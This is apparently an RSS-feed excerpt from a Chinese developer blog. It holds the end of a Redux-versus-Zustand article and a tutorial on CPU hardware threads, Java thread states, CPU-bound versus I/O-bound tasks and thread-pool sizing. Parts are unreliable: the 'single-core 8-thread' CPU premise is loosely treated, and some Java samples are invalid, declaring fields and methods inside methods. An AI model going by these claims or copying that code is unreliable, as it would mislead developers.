<p><strong>新功能优先</strong>：对于新的侧边栏、模态框状态，直接用 Zustand。</p>
</li>
<li>
<p><strong>Redux 瘦身</strong>：逐步将 Redux 中的同步 UI 状态 (UI State) 拆分到 Zustand，只保留复杂的服务器缓存数据 (或者交给 TanStack Query)。</p>
</li>
<li>
<p><strong>双向桥接</strong>：甚至可以在 Redux 中 dispatch Zustand actions，反之亦然，实现平滑过渡。</p>
</li>
</ul>
<h2 data-id="heading-9">6. 总结</h2>
<p>Redux 这位老将完成了它的历史使命。在 2026 年，如果你依然在写 <code>dispatch({ type: ... })</code>，那就像在开手动挡的汽车——虽然硬核，但确实不够快。</p>
<p>拥抱 Zustand，把性能优化交给库作者，把时间留给业务逻辑。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[多线程与CPU线程：从单核8线程到Java线程的真实关系]]></title>    <link>https://juejin.cn/post/7602936997174673460</link>    <guid>https://juejin.cn/post/7602936997174673460</guid>    <pubDate>2026-02-05T05:35:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602936997174673460" data-draft-id="7601007650722660393" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="多线程与CPU线程：从单核8线程到Java线程的真实关系"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T05:35:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aiyuan"/> <meta itemprop="url" content="https://juejin.cn/user/307518984429207"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            多线程与CPU线程：从单核8线程到Java线程的真实关系
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/307518984429207/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aiyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T05:35:17.000Z" title="Thu Feb 05 2026 05:35:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">多线程与CPU线程：从单核8线程到Java线程的真实关系</h2>
<h3 data-id="heading-1">前言</h3>
<p>在实际开发中，我发现自己对多线程与CPU线程的认知一直不够清晰。为了加深理解，我特地在工作间隙请教了AI，并通过这篇文章将学习成果记录下来。</p>
<p>为了更好地阐述CPU线程数与Java线程数之间的关系，我们以<strong>单核8线程的CPU</strong>为例进行详细说明。</p>
<hr/>
<h3 data-id="heading-2">1. CPU运算的使用场景</h3>
<h4 data-id="heading-3">1.1 常见的CPU运算情形</h4>
<p>首先要明确一点：并不是创建多线程后，其中的所有代码就一定会使用CPU运算。下面是一些常见会消耗CPU运算资源的情况：</p>



































<table><thead><tr><th>会使用 CPU 的操作</th></tr></thead><tbody><tr><td>数学计算（加减乘除、幂运算、开方等）</td></tr><tr><td>逻辑运算与位运算</td></tr><tr><td>字符串处理（拼接、截取、查找、分割等）</td></tr><tr><td>集合操作（排序、过滤、遍历等）</td></tr><tr><td>对象创建与序列化</td></tr><tr><td>加密解密操作</td></tr><tr><td>循环中的大量计算</td></tr><tr><td>方法调用执行</td></tr><tr><td>类型转换操作</td></tr></tbody></table>
<h4 data-id="heading-4">1.2 核心概念解析</h4>
<p>针对<strong>单核8线程</strong>的CPU，有几个关键点需要理解：</p>
<ul>
<li><strong>并非真正并行</strong>：并不是说在同一毫秒内可以对8个任务同时进行CPU计算</li>
<li><strong>排队执行机制</strong>：当多个线程在同一时间段都需要CPU计算时，只会有一个线程优先使用CPU，其他线程需要排队等待</li>
<li><strong>线程调度优化</strong>：这里的"8线程"主要是指CPU能够合理地调度和管理8个任务</li>
<li><strong>多核的真正并行</strong>：如果是8核CPU，则有8个独立的CPU核心在工作，这时才能实现真正的并行计算</li>
</ul>
<p><strong>简单总结：</strong></p>
<pre><code class="hljs">✅ 能同时管理8个任务
✅ 能更好地利用CPU空闲时间
❌ 不能真正并行执行8个计算任务
📊 实际效果相当于1.2-1.4个物理核心的运算能力
</code></pre>
<h3 data-id="heading-5">2. AI的生动解释</h3>
<h4 data-id="heading-6">2.1 高速公路类比</h4>
<p><strong>把CPU想象成一条高速公路：</strong></p>
<pre><code class="hljs language-java" lang="java">你的CPU：<span class="hljs-number">1</span>条车道，但画了<span class="hljs-number">8</span>条虚线（超线程）
Tomcat线程：<span class="hljs-number">8</span>辆汽车

实际情况：
- <span class="hljs-number">8</span>辆车都想同时开
- 但只有<span class="hljs-number">1</span>条真实车道
- 车辆快速交替使用车道
- 看起来像<span class="hljs-number">8</span>辆车在开，实际通勤效率只提高<span class="hljs-number">30</span>-<span class="hljs-number">50</span>%
</code></pre>
<h4 data-id="heading-7">2.2 单核8线程的时间线分析</h4>
<p>假设在1毫秒内的调度情况：</p>
<pre><code class="hljs language-java" lang="java">时间点 0ms：<span class="hljs-number">8</span>个请求同时到达
Tomcat状态：创建<span class="hljs-number">8</span>个线程处理请求
CPU状态：<span class="hljs-number">8</span>个硬件线程可用

第<span class="hljs-number">0</span>-<span class="hljs-number">0.</span>1ms：
├── 线程<span class="hljs-number">1</span>：使用CPU解析请求头
├── 线程<span class="hljs-number">2</span>：使用CPU解析请求头  
├── 线程<span class="hljs-number">3</span>：使用CPU解析请求头
├── ...（<span class="hljs-number">8</span>个线程轮流使用CPU）
└── 每个线程分到约<span class="hljs-number">0.</span>0125ms CPU时间

第<span class="hljs-number">0.1</span>-10ms：
├── 线程<span class="hljs-number">1</span>：等待数据库 → 不占CPU
├── 线程<span class="hljs-number">2</span>：等待数据库 → 不占CPU
├── 线程<span class="hljs-number">3</span>：等待数据库 → 不占CPU
├── ...（所有线程都在等待I/O）
└── CPU：完全空闲！可以处理其他任务

第10ms：数据库开始返回数据
第<span class="hljs-number">10</span>-<span class="hljs-number">10.</span>1ms：
├── 线程<span class="hljs-number">1</span>：使用CPU处理数据库结果
├── 线程<span class="hljs-number">2</span>：使用CPU处理数据库结果
├── ...（又轮流使用CPU）
└── 每个线程再分到约<span class="hljs-number">0.</span>0125ms

第<span class="hljs-number">10.1</span>-15ms：
├── 线程<span class="hljs-number">1</span>：等待网络发送 → 不占CPU
├── 线程<span class="hljs-number">2</span>：等待网络发送 → 不占CPU
└── CPU：又空闲了！
</code></pre>
<p><strong>关键洞察：</strong> 请求并不会一次性占用所有CPU资源，CPU只在需要计算时才被使用。</p>
<h4 data-id="heading-8">2.3 Java线程状态与CPU占用</h4>
<p><strong>🎯 RUNNABLE状态：需要CPU，在就绪队列等待</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadLifecycle</span> {
    <span class="hljs-comment">// RUNNABLE状态：需要CPU，在就绪队列等待</span>
    <span class="hljs-comment">// ⭐️ 只有这个状态会占用CPU时间片</span>
    
    <span class="hljs-comment">// WAITING状态：等待I/O，不占CPU</span>
    <span class="hljs-comment">// TIMED_WAITING状态：睡眠中，不占CPU  </span>
    <span class="hljs-comment">// BLOCKED状态：等待锁，不占CPU</span>
}
</code></pre>
<h3 data-id="heading-9">3. Java代码中的CPU使用情况</h3>
<h4 data-id="heading-10">3.1 🎯 会使用CPU的操作</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ✅ 会使用CPU的操作：</span>
<span class="hljs-comment">// 计算密集型操作</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cpuIntensiveOperations</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 数学计算</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> Math.pow(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>);          <span class="hljs-comment">// 幂运算</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> + <span class="hljs-number">2</span> * <span class="hljs-number">3</span> / <span class="hljs-number">4</span>;                  <span class="hljs-comment">// 算术运算</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">sqrt</span> <span class="hljs-operator">=</span> Math.sqrt(<span class="hljs-number">144</span>);             <span class="hljs-comment">// 开方运算</span>
    
    <span class="hljs-comment">// 逻辑运算</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> (a &gt; b) &amp;&amp; (c != d);       <span class="hljs-comment">// 比较和逻辑运算</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">bitwise</span> <span class="hljs-operator">=</span> a &amp; b | c ^ d;              <span class="hljs-comment">// 位运算</span>
    
    <span class="hljs-comment">// 循环计算</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
        total += i * i;                       <span class="hljs-comment">// 大量计算</span>
    }
}

<span class="hljs-comment">// 字符串处理</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stringOperations</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ✅ 使用CPU的操作：</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> str1 + str2 + str3;       <span class="hljs-comment">// 字符串拼接</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">substr</span> <span class="hljs-operator">=</span> str.substring(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>);     <span class="hljs-comment">// 字符串截取</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">contains</span> <span class="hljs-operator">=</span> str.contains(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// 字符串查找</span>
    String[] parts = str.split(<span class="hljs-string">","</span>);          <span class="hljs-comment">// 字符串分割</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">replaced</span> <span class="hljs-operator">=</span> str.replace(<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>);  <span class="hljs-comment">// 字符串替换</span>
}

<span class="hljs-comment">// 集合操作</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">collectionOperations</span><span class="hljs-params">()</span> {
    List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-comment">// ✅ 使用CPU的操作：</span>
    list.sort(Comparator.naturalOrder());     <span class="hljs-comment">// 排序</span>
    Collections.shuffle(list);                <span class="hljs-comment">// 随机打乱</span>
    list.stream().filter(s -&gt; s.length() &gt; <span class="hljs-number">5</span>) <span class="hljs-comment">// Stream处理</span>
                 .map(String::toUpperCase)
                 .collect(Collectors.toList());
}

<span class="hljs-comment">// 对象操作</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">objectOperations</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ✅ 使用CPU的操作：</span>
    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"John"</span>, <span class="hljs-number">25</span>);         <span class="hljs-comment">// 创建对象</span>
    user.setName(<span class="hljs-string">"Mike"</span>);                     <span class="hljs-comment">// 方法调用</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> user.hashCode();               <span class="hljs-comment">// 哈希计算</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> objectMapper.writeValueAsString(user); <span class="hljs-comment">// JSON序列化</span>
}

<span class="hljs-comment">// 加密操作</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">securityOperations</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ✅ 使用CPU的操作：</span>
    <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"MD5"</span>);
    <span class="hljs-type">byte</span>[] digest = md.digest(data);          <span class="hljs-comment">// 哈希计算</span>
    <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">"AES"</span>);
    cipher.init(Cipher.ENCRYPT_MODE, key);    <span class="hljs-comment">// 加密解密</span>
    <span class="hljs-type">byte</span>[] encrypted = cipher.doFinal(data);
}
</code></pre>
<h4 data-id="heading-11">3.2 🚫 不会使用CPU的操作</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// I/O等待操作</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ioOperations</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ❌ 不会使用CPU（线程等待）：</span>
    
    <span class="hljs-comment">// 网络I/O</span>
    ResponseEntity&lt;String&gt; response = restTemplate.getForEntity(url, String.class);
    <span class="hljs-comment">// ⭐️ 等待网络响应期间，线程阻塞，CPU空闲</span>
    
    <span class="hljs-comment">// 数据库I/O</span>
    List&lt;User&gt; users = userRepository.findAll();
    <span class="hljs-comment">// ⭐️ 等待数据库查询期间，线程阻塞，CPU空闲</span>
    
    <span class="hljs-comment">// 文件I/O</span>
    Files.readAllBytes(Paths.get(<span class="hljs-string">"largefile.txt"</span>));
    <span class="hljs-comment">// ⭐️ 等待磁盘读取期间，线程阻塞，CPU空闲</span>
}

<span class="hljs-comment">// 锁等待操作</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockOperations</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(lock) {
            <span class="hljs-comment">// ✅ 这里使用CPU（获取锁后的操作）</span>
            processData();
        }
        <span class="hljs-comment">// ❌ 等待获取锁期间，线程阻塞，CPU空闲</span>
    }
}

<span class="hljs-comment">// 休眠操作</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleepOperations</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ❌ 不会使用CPU：</span>
    Thread.sleep(<span class="hljs-number">1000</span>);        <span class="hljs-comment">// 线程休眠1秒，CPU空闲</span>
    TimeUnit.SECONDS.sleep(<span class="hljs-number">5</span>); <span class="hljs-comment">// 线程休眠5秒，CPU空闲</span>
}

<span class="hljs-comment">// 条件等待</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">conditionOperations</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> lock.newCondition();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">waitForCondition</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            condition.await();  <span class="hljs-comment">// ❌ 等待期间，线程阻塞，CPU空闲</span>
            <span class="hljs-comment">// ✅ 被唤醒后这里的操作使用CPU</span>
            processData();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-12">4. 任务类型识别：快速识别口诀</h3>
<pre><code class="hljs language-diff" lang="diff">💤 I/O密集型口诀：
"三多一少"
<span class="hljs-deletion">- 数据库查询多</span>
<span class="hljs-deletion">- 网络调用多  </span>
<span class="hljs-deletion">- 文件操作多</span>
<span class="hljs-deletion">- CPU计算少</span>

🔥 CPU密集型口诀：
"三高一深"
<span class="hljs-deletion">- 循环迭代高</span>
<span class="hljs-deletion">- 算法复杂度高</span>
<span class="hljs-deletion">- 数学运算高</span>
<span class="hljs-deletion">- 递归层次深</span>

⚖️ 混合型口诀：
"你中有我，我中有你"
<span class="hljs-deletion">- 先查数据后计算</span>
<span class="hljs-deletion">- 边处理边调用</span>
<span class="hljs-deletion">- 多阶段多类型</span>
</code></pre>
<hr/>
<h3 data-id="heading-13">5. 实战案例分析：三类任务的具体表现</h3>
<h4 data-id="heading-14">5.1 💤 I/O密集型任务场景</h4>
<h5 data-id="heading-15">场景1：用户登录验证</h5>
<p><strong>总耗时估算：30.4ms</strong>，其中：</p>
<ul>
<li>CPU计算：0.8ms</li>
<li>I/O等待：29.6ms</li>
<li><strong>I/O比例：97%</strong></li>
</ul>
<p><strong>执行步骤：</strong></p>
<ol>
<li>接收HTTP请求，解析JSON参数（CPU计算：0.1ms）</li>
<li>查询数据库验证用户名密码（I/O等待：15ms）</li>
<li>调用用户服务获取用户详情（I/O等待：5ms）</li>
<li>查询权限系统获取角色权限（I/O等待：3ms）</li>
<li>生成访问令牌（CPU计算：0.2ms）</li>
<li>写入Redis缓存用户会话（I/O等待：2ms）</li>
<li>记录登录日志到数据库（I/O等待：5ms）</li>
<li>返回响应结果（CPU计算：0.1ms）</li>
</ol>
<h5 data-id="heading-16">场景2：订单支付回调处理</h5>
<p><strong>总耗时估算：131.5ms</strong>，其中：</p>
<ul>
<li>CPU计算：0.5ms</li>
<li>I/O等待：131ms</li>
<li><strong>I/O比例：99.6%</strong></li>
</ul>
<p><strong>执行步骤：</strong></p>
<ol>
<li>接收支付网关回调请求（I/O等待：1ms）</li>
<li>验证回调签名（CPU计算：0.5ms）</li>
<li>查询数据库订单状态（I/O等待：5ms）</li>
<li>调用第三方支付API确认支付（I/O等待：100ms）</li>
<li>更新订单支付状态（I/O等待：10ms）</li>
<li>扣除库存数量（I/O等待：5ms）</li>
<li>发送支付成功短信（I/O等待：3ms）</li>
<li>推送支付成功消息到消息队列（I/O等待：2ms）</li>
<li>记录支付流水（I/O等待：5ms）</li>
</ol>
<h4 data-id="heading-17">5.2 🔥 CPU密集型任务场景</h4>
<h5 data-id="heading-18">场景1：图像滤镜批量处理</h5>
<p><strong>总耗时估算：470ms</strong>，其中：</p>
<ul>
<li>CPU计算：460ms</li>
<li>I/O等待：10ms</li>
<li><strong>CPU比例：98%</strong></li>
</ul>
<p><strong>执行步骤：</strong></p>
<ol>
<li>批量读取多张图片到内存（I/O等待：10ms）</li>
<li>逐像素应用高斯模糊滤镜（CPU计算：300ms）</li>
<li>调整图像亮度对比度（CPU计算：50ms）</li>
<li>添加水印文字（CPU计算：30ms）</li>
<li>批量压缩图片质量（CPU计算：80ms）</li>
</ol>
<h5 data-id="heading-19">场景2：大规模数据排序与聚合</h5>
<p><strong>总耗时估算：155ms</strong>，其中：</p>
<ul>
<li>CPU计算：150ms</li>
<li>I/O等待：5ms</li>
<li><strong>CPU比例：97%</strong></li>
</ul>
<p><strong>执行步骤：</strong></p>
<ol>
<li>从内存读取100万条交易记录（I/O等待：5ms）</li>
<li>按时间范围过滤数据（CPU计算：10ms）</li>
<li>按用户ID分组统计（CPU计算：50ms）</li>
<li>对分组结果按金额排序（CPU计算：30ms）</li>
<li>计算百分位数和统计指标（CPU计算：20ms）</li>
<li>生成数据分布直方图（CPU计算：40ms）</li>
</ol>
<h4 data-id="heading-20">5.3 ⚖️ 混合型任务场景</h4>
<h5 data-id="heading-21">场景：电商商品推荐系统</h5>
<p><strong>总耗时估算：260ms</strong>，其中：</p>
<ul>
<li>CPU计算：210ms</li>
<li>I/O等待：50ms</li>
<li><strong>CPU比例：81%，I/O比例：19%</strong></li>
</ul>
<p><strong>执行步骤：</strong></p>
<ol>
<li>查询用户历史行为数据（I/O等待：20ms）</li>
<li>基于协同过滤算法计算相似用户（CPU计算：100ms）</li>
<li>查询相似用户购买的商品（I/O等待：15ms）</li>
<li>应用内容推荐算法过滤候选商品（CPU计算：80ms）</li>
<li>调用库存服务检查商品可用性（I/O等待：10ms）</li>
<li>综合评分排序（CPU计算：30ms）</li>
<li>缓存推荐结果到Redis（I/O等待：5ms）</li>
</ol>
<hr/>
<h3 data-id="heading-22">6. 代码层面：两种任务类型的实现差异</h3>
<h4 data-id="heading-23">6.1 💤 I/O密集型代码示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IoIntensiveTask</span> {
    <span class="hljs-comment">// 特征：大量网络、数据库、文件操作</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processUserData</span><span class="hljs-params">(String userId)</span> {
        <span class="hljs-comment">// 多个I/O操作</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.getUser(userId);        <span class="hljs-comment">// 网络I/O</span>
        List&lt;Order&gt; orders = orderService.getOrders(userId); <span class="hljs-comment">// 网络I/O</span>
        <span class="hljs-type">File</span> <span class="hljs-variable">report</span> <span class="hljs-operator">=</span> generateReport(user, orders);     <span class="hljs-comment">// 可能涉及文件I/O</span>
        emailService.sendReport(user.getEmail(), report); <span class="hljs-comment">// 网络I/O</span>
    }
}
</code></pre>
<h4 data-id="heading-24">6.2 🔥 CPU密集型代码示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CpuIntensiveTask</span> {
    
    <span class="hljs-comment">// 特征1：大量循环计算</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculatePi</span><span class="hljs-params">(<span class="hljs-type">int</span> iterations)</span> {
        <span class="hljs-type">double</span> <span class="hljs-variable">pi</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iterations; i++) {
            pi += Math.pow(-<span class="hljs-number">1</span>, i) / (<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>); <span class="hljs-comment">// 大量数学运算</span>
        }
        <span class="hljs-keyword">return</span> pi * <span class="hljs-number">4</span>;
    }
    
    <span class="hljs-comment">// 特征2：复杂算法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sortLargeArray</span><span class="hljs-params">(<span class="hljs-type">int</span>[] array)</span> {
        Arrays.sort(array);  <span class="hljs-comment">// 快速排序，大量比较和交换</span>
    }
    
    <span class="hljs-comment">// 特征3：递归计算</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fibonacci</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> {
        <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> n;
        <span class="hljs-keyword">return</span> fibonacci(n - <span class="hljs-number">1</span>) + fibonacci(n - <span class="hljs-number">2</span>); <span class="hljs-comment">// 深度递归</span>
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-25">7. 配置策略：针对不同类型优化线程池</h3>
<h4 data-id="heading-26">7.1 核心配置原则</h4>
<p><strong>核心思想：</strong> 不同的任务类型需要不同的线程池配置策略，以达到最佳性能。</p>
